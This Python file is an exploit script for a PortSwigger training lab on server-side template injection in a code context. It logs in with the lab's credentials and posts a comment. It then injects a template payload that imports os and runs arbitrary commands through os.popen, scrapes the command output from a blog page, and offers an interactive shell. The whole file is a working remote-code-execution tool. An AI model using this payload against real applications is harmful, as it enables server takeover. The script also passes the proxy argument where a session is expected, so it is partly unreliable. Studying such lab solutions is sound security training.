from base_scenario import BaseLabScenario
from urllib.parse import urljoin
import re
import html

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"

class Lab2Scenario(BaseLabScenario):
    """Specific implementation for PortSwigger Lab 2: Basic SSTI in code context"""
    def __init__(self, target_url, session):  # Match parent signature
        super().__init__(target_url, session)
    
    def detect(cls, response_text):
        """Check if this is Lab 2 by looking for identifying text"""
        return "Basic server-side template injection (code context)" in response_text
    
    def lab_name(self):
        return "Basic server-side template injection (Lab 2)"
    
    def post_comment(self):
        """Post required comment after login"""
        try:
            # Get post page to extract CSRF
            post_url = urljoin(self.target_url, "/post?postId=9")
            response = self.session.get(post_url)
            csrf_token = self.get_csrf_token(response.text)
            
            if not csrf_token:
                self.print_error("Comment CSRF token not found")
                return False

            # Build comment payload
            comment_data = {
                "csrf": csrf_token,
                "postId": "9",
                "comment": "Hi",
                "name": "hacker",
                "email": "hacker@example.com",
                "website": ""
            }
            
            # Submit comment
            comment_response = self.session.post(
                urljoin(self.target_url, "/post/comment"),
                data=comment_data
            )
            
            return comment_response.status_code == 200
            
        except Exception as e:
            self.print_error(f"Comment posting failed: {str(e)}")
            return False
        
    def execute_command(self, command):
        """Execute command using the SSTI vulnerability"""
        try:
            account_csrf = self.get_account_csrf()
            if not account_csrf:
                return None
            
            payload = (
                "blog-post-author-display=user.name}}"
                "{%25 import os %25}"
                f"{{{{os.popen('{command}').read()}}}}"
                f"&csrf={account_csrf}"
            )
            
            self.session.post(
                urljoin(self.target_url, "/my-account/change-blog-post-author-display"),
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )
            
            response = self.session.get(urljoin(self.target_url, "/post?postId=9"))
            
            # Extract and clean output
            match = re.search(
                r'<img src="/resources/images/avatarDefault\.svg" class="avatar">\s*Peter Wiener\s*(.*?)\s*}}',
                response.text,
                re.DOTALL
            )
            if response.status_code != 200:
                self.print_error(f"Server responded with status {response.status_code}")
                return None
            
            if match:
                output = html.unescape(match.group(1)).split('|')[0].strip()
                return output
            
                
            return None
            
            
        except Exception as e:
            print(f"[-] Command execution error: {str(e)}")
            return None

    def exploit(self):
        """Execute lab-specific exploitation workflow"""
        try:
            if not self.login("wiener", "peter"):
                return False
            # Post required comment
            if not self.post_comment():
                self.print_error("Failed to post initial comment")
                return False
            
            result = self.execute_command("whoami")
            if result and "carlos" in result:
                print(f"{COLOR_GREEN}[+] Command execution successful!{COLOR_RESET}")
                print(f"{COLOR_CYAN}[*] Command output: {COLOR_WHITE}{result}{COLOR_RESET}")
                return True
                
            print("[-] Exploitation failed")
            return False
            
        except Exception as e:
            print(f"[-] Exploit error: {str(e)}")
            return False

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="SSTI Lab 2 Exploiter")
    parser.add_argument("url", help="Target lab URL")
    parser.add_argument("--proxy", help="Proxy server (ip:port)", default=None)
    parser.add_argument("--shell", action="store_true", help="Start interactive shell")
    
    args = parser.parse_args()
    
    print("\n=== Starting Lab 2 Exploitation ===")
    exploiter = Lab2Scenario(args.url.strip(), args.proxy)
    
    if exploiter.exploit() and args.shell:
        exploiter.interactive_shell()
